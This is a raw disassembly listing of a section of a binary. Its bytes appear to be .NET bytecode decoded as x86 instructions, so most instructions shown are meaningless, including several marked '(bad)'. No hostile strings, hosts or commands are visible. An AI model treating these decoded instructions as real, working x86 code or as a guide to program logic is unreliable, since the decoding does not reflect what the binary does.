  404ca8:	00 0a                	add    %cl,(%edx)
  404caa:	28 f8                	sub    %bh,%al
  404cac:	00 00                	add    %al,(%eax)
  404cae:	0a de                	or     %dh,%bl
  404cb0:	0e                   	push   %cs
  404cb1:	25 28 25 00 00       	and    $0x2528,%eax
  404cb6:	0a 0b                	or     (%ebx),%cl
  404cb8:	28 27                	sub    %ah,(%edi)
  404cba:	00 00                	add    %al,(%eax)
  404cbc:	0a de                	or     %dh,%bl
  404cbe:	00 7e f9             	add    %bh,-0x7(%esi)
  404cc1:	00 00                	add    %al,(%eax)
  404cc3:	0a 72 9b             	or     -0x65(%edx),%dh
  404cc6:	02 00                	add    (%eax),%al
  404cc8:	70 17                	jo     0x404ce1
  404cca:	6f                   	outsl  %ds:(%esi),(%dx)
  404ccb:	3c 00                	cmp    $0x0,%al
  404ccd:	00 0a                	add    %cl,(%edx)
  404ccf:	0c 08                	or     $0x8,%al
  404cd1:	7e 0f                	jle    0x404ce2
  404cd3:	00 00                	add    %al,(%eax)
  404cd5:	04 28                	add    $0x28,%al
  404cd7:	35 00 00 0a 16       	xor    $0x160a0000,%eax
  404cdc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cdd:	fa                   	cli
  404cde:	00 00                	add    %al,(%eax)
  404ce0:	0a de                	or     %dh,%bl
  404ce2:	0e                   	push   %cs
  404ce3:	25 28 25 00 00       	and    $0x2528,%eax
  404ce8:	0a 0d 28 27 00 00    	or     0x2728,%cl
  404cee:	0a de                	or     %dh,%bl
  404cf0:	00 73 4a             	add    %dh,0x4a(%ebx)
  404cf3:	00 00                	add    %al,(%eax)
  404cf5:	0a 13                	or     (%ebx),%dl
  404cf7:	11 11                	adc    %edx,(%ecx)
  404cf9:	11 72 00             	adc    %esi,0x0(%edx)
  404cfc:	0d 00 70 6f 4b       	or     $0x4b6f7000,%eax
  404d01:	00 00                	add    %al,(%eax)
  404d03:	0a 11                	or     (%ecx),%dl
  404d05:	11 72 12             	adc    %esi,0x12(%edx)
  404d08:	0d 00 70 7e 0f       	or     $0xf7e7000,%eax
  404d0d:	00 00                	add    %al,(%eax)
  404d0f:	04 28                	add    $0x28,%al
  404d11:	35 00 00 0a 72       	xor    $0x720a0000,%eax
  404d16:	53                   	push   %ebx
  404d17:	02 00                	add    (%eax),%al
  404d19:	70 28                	jo     0x404d43
  404d1b:	28 00                	sub    %al,(%eax)
  404d1d:	00 0a                	add    %cl,(%edx)
  404d1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404d20:	37                   	aaa
  404d21:	00 00                	add    %al,(%eax)
  404d23:	0a 11                	or     (%ecx),%dl
  404d25:	11 17                	adc    %edx,(%edi)
  404d27:	6f                   	outsl  %ds:(%esi),(%dx)
  404d28:	33 00                	xor    (%eax),%eax
  404d2a:	00 0a                	add    %cl,(%edx)
  404d2c:	11 11                	adc    %edx,(%ecx)
  404d2e:	17                   	pop    %ss
  404d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  404d30:	fb                   	sti
  404d31:	00 00                	add    %al,(%eax)
  404d33:	0a 11                	or     (%ecx),%dl
  404d35:	11 28                	adc    %ebp,(%eax)
  404d37:	38 00                	cmp    %al,(%eax)
  404d39:	00 0a                	add    %cl,(%edx)
  404d3b:	26 de 0f             	fimuls %es:(%edi)
  404d3e:	25 28 25 00 00       	and    $0x2528,%eax
  404d43:	0a 13                	or     (%ebx),%dl
  404d45:	04 28                	add    $0x28,%al
  404d47:	27                   	daa
  404d48:	00 00                	add    %al,(%eax)
  404d4a:	0a de                	or     %dh,%bl
  404d4c:	00 1d 28 3e 00 00    	add    %bl,0x3e28
  404d52:	0a 72 c9             	or     -0x37(%edx),%dh
  404d55:	01 00                	add    %eax,(%eax)
  404d57:	70 7e                	jo     0x404dd7
  404d59:	0f 00 00             	sldt   (%eax)
  404d5c:	04 28                	add    $0x28,%al
  404d5e:	35 00 00 0a 72       	xor    $0x720a0000,%eax
  404d63:	f7 02 00 70 28 3f    	testl  $0x3f287000,(%edx)
  404d69:	00 00                	add    %al,(%eax)
  404d6b:	0a 13                	or     (%ebx),%dl
  404d6d:	05 11 05 28 2e       	add    $0x2e280511,%eax
  404d72:	00 00                	add    %al,(%eax)
  404d74:	0a 2c 11             	or     (%ecx,%edx,1),%ch
  404d77:	7e 29                	jle    0x404da2
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	04 6f                	add    $0x6f,%al
  404d7d:	ab                   	stos   %eax,%es:(%edi)
  404d7e:	00 00                	add    %al,(%eax)
  404d80:	0a 11                	or     (%ecx),%dl
  404d82:	05 28 f8 00 00       	add    $0xf828,%eax
  404d87:	0a de                	or     %dh,%bl
  404d89:	0f 25                	(bad)
  404d8b:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  404d91:	06                   	push   %es
  404d92:	28 27                	sub    %ah,(%edi)
  404d94:	00 00                	add    %al,(%eax)
  404d96:	0a de                	or     %dh,%bl
  404d98:	00 28                	add    %ch,(%eax)
  404d9a:	49                   	dec    %ecx
  404d9b:	00 00                	add    %al,(%eax)
  404d9d:	06                   	push   %es
  404d9e:	28 fc                	sub    %bh,%ah
  404da0:	00 00                	add    %al,(%eax)
  404da2:	0a 13                	or     (%ebx),%dl
  404da4:	13 16                	adc    (%esi),%edx
  404da6:	13 12                	adc    (%edx),%edx
  404da8:	38 b7 00 00 00 11    	cmp    %dh,0x11000000(%edi)
  404dae:	13 11                	adc    (%ecx),%edx
  404db0:	12 9a 13 07 11 07    	adc    0x7110713(%edx),%bl
  404db6:	6f                   	outsl  %ds:(%esi),(%dx)
  404db7:	fd                   	std
  404db8:	00 00                	add    %al,(%eax)
  404dba:	0a 39                	or     (%ecx),%bh
  404dbc:	9e                   	sahf
  404dbd:	00 00                	add    %al,(%eax)
  404dbf:	00 11                	add    %dl,(%ecx)
  404dc1:	07                   	pop    %es
  404dc2:	6f                   	outsl  %ds:(%esi),(%dx)
  404dc3:	fe 00                	incb   (%eax)
  404dc5:	00 0a                	add    %cl,(%edx)
  404dc7:	18 40 91             	sbb    %al,-0x6f(%eax)
  404dca:	00 00                	add    %al,(%eax)
  404dcc:	00 11                	add    %dl,(%ecx)
  404dce:	07                   	pop    %es
  404dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  404dd0:	ff 00                	incl   (%eax)
  404dd2:	00 0a                	add    %cl,(%edx)
  404dd4:	13 08                	adc    (%eax),%ecx
  404dd6:	72 36                	jb     0x404e0e
  404dd8:	0d 00 70 11 08       	or     $0x8117000,%eax
  404ddd:	72 52                	jb     0x404e31
  404ddf:	0d 00 70 28 28       	or     $0x28287000,%eax
  404de4:	00 00                	add    %al,(%eax)
  404de6:	0a 16                	or     (%esi),%dl
  404de8:	16                   	push   %ss
  404de9:	15 28 ba 00 00       	adc    $0xba28,%eax
  404dee:	0a 26                	or     (%esi),%ah
  404df0:	11 08                	adc    %ecx,(%eax)
  404df2:	7e 0d                	jle    0x404e01
  404df4:	00 00                	add    %al,(%eax)
  404df6:	04 28                	add    $0x28,%al
  404df8:	1f                   	pop    %ds
  404df9:	00 00                	add    %al,(%eax)
  404dfb:	0a 28                	or     (%eax),%ch
  404dfd:	f8                   	clc
  404dfe:	00 00                	add    %al,(%eax)
  404e00:	0a de                	or     %dh,%bl
  404e02:	0f 25                	(bad)
  404e04:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  404e0a:	0b 28                	or     (%eax),%ebp
  404e0c:	27                   	daa
  404e0d:	00 00                	add    %al,(%eax)
  404e0f:	0a de                	or     %dh,%bl
  404e11:	00 11                	add    %dl,(%ecx)
  404e13:	08 72 66             	or     %dh,0x66(%edx)
  404e16:	0d 00 70 28 00       	or     $0x287000,%eax
  404e1b:	01 00                	add    %eax,(%eax)
  404e1d:	0a 13                	or     (%ebx),%dl
  404e1f:	09 11                	or     %edx,(%ecx)
  404e21:	09 13                	or     %edx,(%ebx)
  404e23:	15 16 13 14 2b       	adc    $0x2b141316,%eax
  404e28:	2a 11                	sub    (%ecx),%dl
  404e2a:	15 11 14 9a 13       	adc    $0x139a1411,%eax
  404e2f:	0a 11                	or     (%ecx),%dl
  404e31:	0a 28                	or     (%eax),%ch
  404e33:	23 00                	and    (%eax),%eax
  404e35:	00 0a                	add    %cl,(%edx)
  404e37:	28 f8                	sub    %bh,%al
  404e39:	00 00                	add    %al,(%eax)
  404e3b:	0a de                	or     %dh,%bl
  404e3d:	0f 25                	(bad)
  404e3f:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  404e45:	0c 28                	or     $0x28,%al
  404e47:	27                   	daa
  404e48:	00 00                	add    %al,(%eax)
  404e4a:	0a de                	or     %dh,%bl
  404e4c:	00 11                	add    %dl,(%ecx)
  404e4e:	14 17                	adc    $0x17,%al
  404e50:	d6                   	salc
  404e51:	13 14 11             	adc    (%ecx,%edx,1),%edx
  404e54:	14 11                	adc    $0x11,%al
  404e56:	15 8e b7 32 ce       	adc    $0xce32b78e,%eax
  404e5b:	14 13                	adc    $0x13,%al
  404e5d:	08 11                	or     %dl,(%ecx)
  404e5f:	12 17                	adc    (%edi),%dl
  404e61:	d6                   	salc
  404e62:	13 12                	adc    (%edx),%edx
  404e64:	11 12                	adc    %edx,(%edx)
  404e66:	11 13                	adc    %edx,(%ebx)
  404e68:	8e b7 3f 3e ff ff    	mov    -0xc1c1(%edi),%?
  404e6e:	ff                   	lcall  (bad)
  404e6f:	de 0f                	fimuls (%edi)
  404e71:	25 28 25 00 00       	and    $0x2528,%eax
  404e76:	0a 13                	or     (%ebx),%dl
  404e78:	0d 28 27 00 00       	or     $0x2728,%eax
  404e7d:	0a de                	or     %dh,%bl
  404e7f:	00 28                	add    %ch,(%eax)
  404e81:	61                   	popa
  404e82:	00 00                	add    %al,(%eax)
  404e84:	06                   	push   %es
  404e85:	28 01                	sub    %al,(%ecx)
  404e87:	01 00                	add    %eax,(%eax)
  404e89:	0a 72 72             	or     0x72(%edx),%dh
  404e8c:	0d 00 70 28 1f       	or     $0x1f287000,%eax
  404e91:	00 00                	add    %al,(%eax)
  404e93:	0a 13                	or     (%ebx),%dl
  404e95:	0e                   	push   %cs
  404e96:	11 0e                	adc    %ecx,(%esi)
  404e98:	73 02                	jae    0x404e9c
  404e9a:	01 00                	add    %eax,(%eax)
  404e9c:	0a 13                	or     (%ebx),%dl
  404e9e:	0f 11 0f             	movups %xmm1,(%edi)
  404ea1:	72 7c                	jb     0x404f1f
  404ea3:	0d 00 70 6f 03       	or     $0x36f7000,%eax
  404ea8:	01 00                	add    %eax,(%eax)
  404eaa:	0a 11                	or     (%ecx),%dl
  404eac:	0f 72                	psrld  $0x72,(bad)
  404eae:	90                   	nop
  404eaf:	0d 00 70 6f 03       	or     $0x36f7000,%eax
  404eb4:	01 00                	add    %eax,(%eax)
  404eb6:	0a 11                	or     (%ecx),%dl
  404eb8:	0f 72                	pslld  $0x72,(bad)
  404eba:	b0 0d                	mov    $0xd,%al
  404ebc:	00 70 28             	add    %dh,0x28(%eax)
  404ebf:	04 01                	add    $0x1,%al
  404ec1:	00 0a                	add    %cl,(%edx)
  404ec3:	28 1f                	sub    %bl,(%edi)
  404ec5:	00 00                	add    %al,(%eax)
  404ec7:	0a 6f 03             	or     0x3(%edi),%ch
  404eca:	01 00                	add    %eax,(%eax)
  404ecc:	0a 11                	or     (%ecx),%dl
  404ece:	0f 72                	(bad)
  404ed0:	b8 0d 00 70 28       	mov    $0x2870000d,%eax
  404ed5:	05 01 00 0a 28       	add    $0x280a0001,%eax
  404eda:	4f                   	dec    %edi
  404edb:	00 00                	add    %al,(%eax)
  404edd:	0a 72 c4             	or     -0x3c(%edx),%dh
  404ee0:	0d 00 70 28 28       	or     $0x28287000,%eax
  404ee5:	00 00                	add    %al,(%eax)
  404ee7:	0a 6f 03             	or     0x3(%edi),%ch
  404eea:	01 00                	add    %eax,(%eax)
  404eec:	0a 11                	or     (%ecx),%dl
  404eee:	0f 72                	pslld  $0x72,(bad)
  404ef0:	b0 0d                	mov    $0xd,%al
  404ef2:	00 70 28             	add    %dh,0x28(%eax)
  404ef5:	b6 00                	mov    $0x0,%dh
  404ef7:	00 0a                	add    %cl,(%edx)
  404ef9:	28 1f                	sub    %bl,(%edi)
  404efb:	00 00                	add    %al,(%eax)
  404efd:	0a 6f 03             	or     0x3(%edi),%ch
  404f00:	01 00                	add    %eax,(%eax)
  404f02:	0a 11                	or     (%ecx),%dl
  404f04:	0f 72                	(bad)
  404f06:	b8 0d 00 70 11       	mov    $0x1170000d,%eax
  404f0b:	0e                   	push   %cs
  404f0c:	28 4f 00             	sub    %cl,0x0(%edi)
  404f0f:	00 0a                	add    %cl,(%edx)
  404f11:	72 c4                	jb     0x404ed7
  404f13:	0d 00 70 28 28       	or     $0x28287000,%eax
  404f18:	00 00                	add    %al,(%eax)
  404f1a:	0a 6f 03             	or     0x3(%edi),%ch
  404f1d:	01 00                	add    %eax,(%eax)
  404f1f:	0a de                	or     %dh,%bl
  404f21:	0c 11                	or     $0x11,%al
  404f23:	0f 2c 07             	cvttps2pi (%edi),%mm0
  404f26:	11 0f                	adc    %ecx,(%edi)
  404f28:	6f                   	outsl  %ds:(%esi),(%dx)
  404f29:	5e                   	pop    %esi
  404f2a:	00 00                	add    %al,(%eax)
  404f2c:	0a dc                	or     %ah,%bl
  404f2e:	02 2c 15 03 28 b9 00 	add    0xb92803(,%edx,1),%ch
  404f35:	00 0a                	add    %cl,(%edx)
  404f37:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  404f3b:	25 00 00 0a 28       	and    $0x280a0000,%eax
  404f40:	27                   	daa
  404f41:	00 00                	add    %al,(%eax)
  404f43:	0a de                	or     %dh,%bl
  404f45:	00 73 4a             	add    %dh,0x4a(%ebx)
  404f48:	00 00                	add    %al,(%eax)
  404f4a:	0a 13                	or     (%ebx),%dl
  404f4c:	11 11                	adc    %edx,(%ecx)
  404f4e:	11 11                	adc    %edx,(%ecx)
  404f50:	0e                   	push   %cs
  404f51:	6f                   	outsl  %ds:(%esi),(%dx)
  404f52:	4b                   	dec    %ebx
  404f53:	00 00                	add    %al,(%eax)
  404f55:	0a 11                	or     (%ecx),%dl
  404f57:	11 17                	adc    %edx,(%edi)
  404f59:	6f                   	outsl  %ds:(%esi),(%dx)
  404f5a:	fb                   	sti
  404f5b:	00 00                	add    %al,(%eax)
  404f5d:	0a 11                	or     (%ecx),%dl
  404f5f:	11 16                	adc    %edx,(%esi)
  404f61:	6f                   	outsl  %ds:(%esi),(%dx)
  404f62:	06                   	push   %es
  404f63:	01 00                	add    %eax,(%eax)
  404f65:	0a 11                	or     (%ecx),%dl
  404f67:	11 16                	adc    %edx,(%esi)
  404f69:	6f                   	outsl  %ds:(%esi),(%dx)
  404f6a:	07                   	pop    %es
  404f6b:	01 00                	add    %eax,(%eax)
  404f6d:	0a 11                	or     (%ecx),%dl
  404f6f:	11 17                	adc    %edx,(%edi)
  404f71:	6f                   	outsl  %ds:(%esi),(%dx)
  404f72:	33 00                	xor    (%eax),%eax
  404f74:	00 0a                	add    %cl,(%edx)
  404f76:	11 11                	adc    %edx,(%ecx)
  404f78:	28 38                	sub    %bh,(%eax)
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	0a 26                	or     (%esi),%ah
  404f7e:	16                   	push   %ss
  404f7f:	28 26                	sub    %ah,(%esi)
  404f81:	00 00                	add    %al,(%eax)
  404f83:	0a de                	or     %dh,%bl
  404f85:	0f 25                	(bad)
  404f87:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  404f8d:	10 28                	adc    %ch,(%eax)
  404f8f:	27                   	daa
  404f90:	00 00                	add    %al,(%eax)
  404f92:	0a de                	or     %dh,%bl
  404f94:	00 2a                	add    %ch,(%edx)
  404f96:	00 00                	add    %al,(%eax)
  404f98:	41                   	inc    %ecx
  404f99:	0c 01                	or     $0x1,%al
  404f9b:	00 00                	add    %al,(%eax)
  404f9d:	00 00                	add    %al,(%eax)
  404f9f:	00 03                	add    %al,(%ebx)
  404fa1:	00 00                	add    %al,(%eax)
  404fa3:	00 21                	add    %ah,(%ecx)
  404fa5:	00 00                	add    %al,(%eax)
  404fa7:	00 24 00             	add    %ah,(%eax,%eax,1)
  404faa:	00 00                	add    %al,(%eax)
  404fac:	0e                   	push   %cs
  404fad:	00 00                	add    %al,(%eax)
  404faf:	00 29                	add    %ch,(%ecx)
  404fb1:	00 00                	add    %al,(%eax)
  404fb3:	01 00                	add    %eax,(%eax)
  404fb5:	00 00                	add    %al,(%eax)
  404fb7:	00 32                	add    %dh,(%edx)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	00 1b                	add    %bl,(%ebx)
  404fbd:	00 00                	add    %al,(%eax)
  404fbf:	00 4d 00             	add    %cl,0x0(%ebp)
  404fc2:	00 00                	add    %al,(%eax)
  404fc4:	0e                   	push   %cs
  404fc5:	00 00                	add    %al,(%eax)
  404fc7:	00 29                	add    %ch,(%ecx)
  404fc9:	00 00                	add    %al,(%eax)
  404fcb:	01 00                	add    %eax,(%eax)
  404fcd:	00 00                	add    %al,(%eax)
  404fcf:	00 5b 00             	add    %bl,0x0(%ebx)
  404fd2:	00 00                	add    %al,(%eax)
  404fd4:	24 00                	and    $0x0,%al
  404fd6:	00 00                	add    %al,(%eax)
  404fd8:	7f 00                	jg     0x404fda
  404fda:	00 00                	add    %al,(%eax)
  404fdc:	0e                   	push   %cs
  404fdd:	00 00                	add    %al,(%eax)
  404fdf:	00 29                	add    %ch,(%ecx)
  404fe1:	00 00                	add    %al,(%eax)
  404fe3:	01 00                	add    %eax,(%eax)
  404fe5:	00 00                	add    %al,(%eax)
  404fe7:	00 8d 00 00 00 4d    	add    %cl,0x4d000000(%ebp)
  404fed:	00 00                	add    %al,(%eax)
  404fef:	00 da                	add    %bl,%dl
  404ff1:	00 00                	add    %al,(%eax)
  404ff3:	00 0f                	add    %cl,(%edi)
  404ff5:	00 00                	add    %al,(%eax)
  404ff7:	00 29                	add    %ch,(%ecx)
  404ff9:	00 00                	add    %al,(%eax)
  404ffb:	01 00                	add    %eax,(%eax)
  404ffd:	00 00                	add    %al,(%eax)
  404fff:	00 e9                	add    %ch,%cl
  405001:	00 00                	add    %al,(%eax)
  405003:	00 3d 00 00 00 26    	add    %bh,0x26000000
  405009:	01 00                	add    %eax,(%eax)
  40500b:	00 0f                	add    %cl,(%edi)
  40500d:	00 00                	add    %al,(%eax)
  40500f:	00 29                	add    %ch,(%ecx)
  405011:	00 00                	add    %al,(%eax)
  405013:	01 00                	add    %eax,(%eax)
  405015:	00 00                	add    %al,(%eax)
  405017:	00 72 01             	add    %dh,0x1(%edx)
  40501a:	00 00                	add    %al,(%eax)
  40501c:	2d 00 00 00 9f       	sub    $0x9f000000,%eax
  405021:	01 00                	add    %eax,(%eax)
  405023:	00 0f                	add    %cl,(%edi)
  405025:	00 00                	add    %al,(%eax)
  405027:	00 29                	add    %ch,(%ecx)
  405029:	00 00                	add    %al,(%eax)
  40502b:	01 00                	add    %eax,(%eax)
  40502d:	00 00                	add    %al,(%eax)
  40502f:	00 cc                	add    %cl,%ah
  405031:	01 00                	add    %eax,(%eax)
  405033:	00 0e                	add    %cl,(%esi)
  405035:	00 00                	add    %al,(%eax)
  405037:	00 da                	add    %bl,%dl
  405039:	01 00                	add    %eax,(%eax)
  40503b:	00 0f                	add    %cl,(%edi)
  40503d:	00 00                	add    %al,(%eax)
  40503f:	00 29                	add    %ch,(%ecx)
  405041:	00 00                	add    %al,(%eax)
  405043:	01 00                	add    %eax,(%eax)
  405045:	00 00                	add    %al,(%eax)
  405047:	00 3a                	add    %bh,(%edx)
  405049:	01 00                	add    %eax,(%eax)
  40504b:	00 d3                	add    %dl,%bl
  40504d:	00 00                	add    %al,(%eax)
  40504f:	00 0d 02 00 00 0f    	add    %cl,0xf000002
  405055:	00 00                	add    %al,(%eax)
  405057:	00 29                	add    %ch,(%ecx)
  405059:	00 00                	add    %al,(%eax)
  40505b:	01 02                	add    %eax,(%edx)
  40505d:	00 00                	add    %al,(%eax)
  40505f:	00 3b                	add    %bh,(%ebx)
  405061:	02 00                	add    (%eax),%al
  405063:	00 83 00 00 00 be    	add    %al,-0x42000000(%ebx)
  405069:	02 00                	add    (%eax),%al
  40506b:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  405076:	00 00                	add    %al,(%eax)
  405078:	cd 02                	int    $0x2
  40507a:	00 00                	add    %al,(%eax)
  40507c:	09 00                	or     %eax,(%eax)
  40507e:	00 00                	add    %al,(%eax)
  405080:	d6                   	salc
  405081:	02 00                	add    (%eax),%al
  405083:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405086:	00 00                	add    %al,(%eax)
  405088:	29 00                	sub    %eax,(%eax)
  40508a:	00 01                	add    %al,(%ecx)
  40508c:	00 00                	add    %al,(%eax)
  40508e:	00 00                	add    %al,(%eax)
  405090:	21 02                	and    %eax,(%edx)
  405092:	00 00                	add    %al,(%eax)
  405094:	01 01                	add    %eax,(%ecx)
  405096:	00 00                	add    %al,(%eax)
  405098:	22 03                	and    (%ebx),%al
  40509a:	00 00                	add    %al,(%eax)
  40509c:	0f 00 00             	sldt   (%eax)
  40509f:	00 29                	add    %ch,(%ecx)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	01 1e                	add    %ebx,(%esi)
  4050a5:	02 28                	add    (%eax),%ch
  4050a7:	17                   	pop    %ss
  4050a8:	00 00                	add    %al,(%eax)
  4050aa:	0a 2a                	or     (%edx),%ch
  4050ac:	1b 30                	sbb    (%eax),%esi
  4050ae:	02 00                	add    (%eax),%al
  4050b0:	32 00                	xor    (%eax),%al
  4050b2:	00 00                	add    %al,(%eax)
  4050b4:	2f                   	das
  4050b5:	00 00                	add    %al,(%eax)
  4050b7:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  4050ba:	06                   	push   %es
  4050bb:	4a                   	dec    %edx
  4050bc:	00 00                	add    %al,(%eax)
  4050be:	06                   	push   %es
  4050bf:	73 46                	jae    0x405107
  4050c1:	00 00                	add    %al,(%eax)
  4050c3:	0a 17                	or     (%edi),%dl
  4050c5:	73 08                	jae    0x4050cf
  4050c7:	01 00                	add    %eax,(%eax)
  4050c9:	0a 80 22 00 00 04    	or     0x4000022(%eax),%al
  4050cf:	7e 22                	jle    0x4050f3
  4050d1:	00 00                	add    %al,(%eax)
  4050d3:	04 6f                	add    $0x6f,%al
  4050d5:	48                   	dec    %eax
  4050d6:	00 00                	add    %al,(%eax)
  4050d8:	0a de                	or     %dh,%bl
  4050da:	0e                   	push   %cs
  4050db:	25 28 25 00 00       	and    $0x2528,%eax
  4050e0:	0a 0a                	or     (%edx),%cl
  4050e2:	28 27                	sub    %ah,(%edi)
  4050e4:	00 00                	add    %al,(%eax)
  4050e6:	0a de                	or     %dh,%bl
  4050e8:	00 2a                	add    %ch,(%edx)
  4050ea:	00 00                	add    %al,(%eax)
  4050ec:	01 10                	add    %edx,(%eax)
  4050ee:	00 00                	add    %al,(%eax)
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 00                	add    %al,(%eax)
  4050f4:	23 23                	and    (%ebx),%esp
  4050f6:	00 0e                	add    %cl,(%esi)
  4050f8:	29 00                	sub    %eax,(%eax)
  4050fa:	00 01                	add    %al,(%ecx)
  4050fc:	1b 30                	sbb    (%eax),%esi
  4050fe:	02 00                	add    (%eax),%al
  405100:	1b 00                	sbb    (%eax),%eax
  405102:	00 00                	add    %al,(%eax)
  405104:	30 00                	xor    %al,(%eax)
  405106:	00 11                	add    %dl,(%ecx)
  405108:	7e 22                	jle    0x40512c
  40510a:	00 00                	add    %al,(%eax)
  40510c:	04 6f                	add    $0x6f,%al
  40510e:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  405113:	0e                   	push   %cs
  405114:	25 28 25 00 00       	and    $0x2528,%eax
  405119:	0a 0a                	or     (%edx),%cl
  40511b:	28 27                	sub    %ah,(%edi)
  40511d:	00 00                	add    %al,(%eax)
  40511f:	0a de                	or     %dh,%bl
  405121:	00 2a                	add    %ch,(%edx)
  405123:	00 01                	add    %al,(%ecx)
  405125:	10 00                	adc    %al,(%eax)
  405127:	00 00                	add    %al,(%eax)
  405129:	00 00                	add    %al,(%eax)
  40512b:	00 0c 0c             	add    %cl,(%esp,%ecx,1)
  40512e:	00 0e                	add    %cl,(%esi)
  405130:	29 00                	sub    %eax,(%eax)
  405132:	00 01                	add    %al,(%ecx)
  405134:	1b 30                	sbb    (%eax),%esi
  405136:	11 00                	adc    %eax,(%eax)
  405138:	cd 08                	int    $0x8
  40513a:	00 00                	add    %al,(%eax)
  40513c:	31 00                	xor    %eax,(%eax)
  40513e:	00 11                	add    %dl,(%ecx)
  405140:	17                   	pop    %ss
  405141:	13 17                	adc    (%edi),%edx
  405143:	72 d4                	jb     0x405119
  405145:	0d 00 70 72 1d       	or     $0x1d727000,%eax
  40514a:	03 00                	add    (%eax),%eax
  40514c:	70 28                	jo     0x405176
  40514e:	40                   	inc    %eax
  40514f:	00 00                	add    %al,(%eax)
  405151:	0a 28                	or     (%eax),%ch
  405153:	11 00                	adc    %eax,(%eax)
  405155:	00 0a                	add    %cl,(%edx)
  405157:	0b 38                	or     (%eax),%edi
  405159:	30 07                	xor    %al,(%edi)
  40515b:	00 00                	add    %al,(%eax)
  40515d:	28 27                	sub    %ah,(%edi)
  40515f:	00 00                	add    %al,(%eax)
  405161:	0a 17                	or     (%edi),%dl
  405163:	13 15 1b 13 17 28    	adc    0x2817131b,%edx
  405169:	04 00                	add    $0x0,%al
  40516b:	00 06                	add    %al,(%esi)
  40516d:	6f                   	outsl  %ds:(%esi),(%dx)
  40516e:	3a 00                	cmp    (%eax),%al
  405170:	00 0a                	add    %cl,(%edx)
  405172:	6f                   	outsl  %ds:(%esi),(%dx)
  405173:	3b 00                	cmp    (%eax),%eax
  405175:	00 0a                	add    %cl,(%edx)
  405177:	72 f0                	jb     0x405169
  405179:	0d 00 70 17 6f       	or     $0x6f177000,%eax
  40517e:	3c 00                	cmp    $0x0,%al
  405180:	00 0a                	add    %cl,(%edx)
  405182:	0c 1c                	or     $0x1c,%al
  405184:	13 17                	adc    (%edi),%edx
  405186:	08 72 68             	or     %dh,0x68(%edx)
  405189:	0e                   	push   %cs
  40518a:	00 70 6f             	add    %dh,0x6f(%eax)
  40518d:	09 01                	or     %eax,(%ecx)
  40518f:	00 0a                	add    %cl,(%edx)
  405191:	17                   	pop    %ss
  405192:	8c 7d 00             	mov    %?,0x0(%ebp)
  405195:	00 01                	add    %al,(%ecx)
  405197:	16                   	push   %ss
  405198:	28 d8                	sub    %bl,%al
  40519a:	00 00                	add    %al,(%eax)
  40519c:	0a 2c 14             	or     (%esp,%edx,1),%ch
  40519f:	1d 13 17 08 72       	sbb    $0x72081713,%eax
  4051a4:	68 0e 00 70 16       	push   $0x1670000e
  4051a9:	8c 7d 00             	mov    %?,0x0(%ebp)
  4051ac:	00 01                	add    %al,(%ecx)
  4051ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4051af:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  4051b4:	09 13                	or     %edx,(%ebx)
  4051b6:	17                   	pop    %ss
  4051b7:	28 fc                	sub    %bh,%ah
  4051b9:	00 00                	add    %al,(%eax)
  4051bb:	0a 13                	or     (%ebx),%dl
  4051bd:	0b 16                	or     (%esi),%edx
  4051bf:	13 0a                	adc    (%edx),%ecx
  4051c1:	38 ae 06 00 00 11    	cmp    %ch,0x11000006(%esi)
  4051c7:	0b 11                	or     (%ecx),%edx
  4051c9:	0a 9a 0d 1f 0a 13    	or     0x130a1f0d(%edx),%bl
  4051cf:	17                   	pop    %ss
  4051d0:	09 6f fd             	or     %ebp,-0x3(%edi)
  4051d3:	00 00                	add    %al,(%eax)
  4051d5:	0a 39                	or     (%ecx),%bh
  4051d7:	8f 06                	pop    (%esi)
  4051d9:	00 00                	add    %al,(%eax)
  4051db:	1f                   	pop    %ds
  4051dc:	0b 13                	or     (%ebx),%edx
  4051de:	17                   	pop    %ss
  4051df:	09 6f fe             	or     %ebp,-0x2(%edi)
  4051e2:	00 00                	add    %al,(%eax)
  4051e4:	0a 18                	or     (%eax),%bl
  4051e6:	40                   	inc    %eax
  4051e7:	7f 06                	jg     0x4051ef
  4051e9:	00 00                	add    %al,(%eax)
  4051eb:	1f                   	pop    %ds
  4051ec:	0c 13                	or     $0x13,%al
  4051ee:	17                   	pop    %ss
  4051ef:	09 6f ff             	or     %ebp,-0x1(%edi)
  4051f2:	00 00                	add    %al,(%eax)
  4051f4:	0a 0a                	or     (%edx),%cl
  4051f6:	1f                   	pop    %ds
  4051f7:	0d 13 17 06 7e       	or     $0x7e061713,%eax
  4051fc:	0d 00 00 04 28       	or     $0x28040000,%eax
  405201:	1f                   	pop    %ds
  405202:	00 00                	add    %al,(%eax)
  405204:	0a 28                	or     (%eax),%ch
  405206:	2e 00 00             	add    %al,%cs:(%eax)
  405209:	0a 2d 33 1f 0e 13    	or     0x130e1f33,%ch
  40520f:	17                   	pop    %ss
  405210:	06                   	push   %es
  405211:	7e 0d                	jle    0x405220
  405213:	00 00                	add    %al,(%eax)
  405215:	04 28                	add    $0x28,%al
  405217:	1f                   	pop    %ds
  405218:	00 00                	add    %al,(%eax)
  40521a:	0a 7e 2d             	or     0x2d(%esi),%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	04 28                	add    $0x28,%al
  405221:	30 00                	xor    %al,(%eax)
  405223:	00 0a                	add    %cl,(%edx)
  405225:	28 31                	sub    %dh,(%ecx)
  405227:	00 00                	add    %al,(%eax)
  405229:	0a 1f                	or     (%edi),%bl
  40522b:	0f 13 17             	movlps %xmm2,(%edi)
  40522e:	06                   	push   %es
